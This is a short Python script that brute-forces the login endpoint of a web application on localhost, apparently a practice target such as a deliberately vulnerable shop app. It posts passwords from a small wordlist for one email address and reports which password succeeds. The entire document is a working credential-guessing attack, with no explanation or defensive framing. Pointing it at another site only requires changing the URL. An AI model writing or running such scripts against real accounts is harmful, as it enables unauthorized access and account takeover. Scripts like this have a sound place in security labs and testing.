import requests

url = "http://localhost:3000/rest/user/login"

wordlist = ["password123", "123456", "tamago321", "admin123", "letmein"]

headers = {"Content-Type": "application/json"}

def brute_force_login(email, wordlist):
    for password in wordlist:
        data = {"email": email, "password": password}
        
        try:
            res = requests.post(url, json=data, headers=headers)
            
            if res.status_code == 200:
                try:
                    resp = res.json()
                    if "authentication" in resp: 
                        print(f"[+] Login successful with password: {password}")
                        break
                except requests.exceptions.JSONDecodeError:
                    print(f"[-] Failed login attempt (not JSON) with password: {password}")
            else:
                print(f"[-] Failed login attempt with password: {password} (Status: {res.status_code})")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error occurred: {e}")
        
brute_force_login("tamago@gmail.com", wordlist)
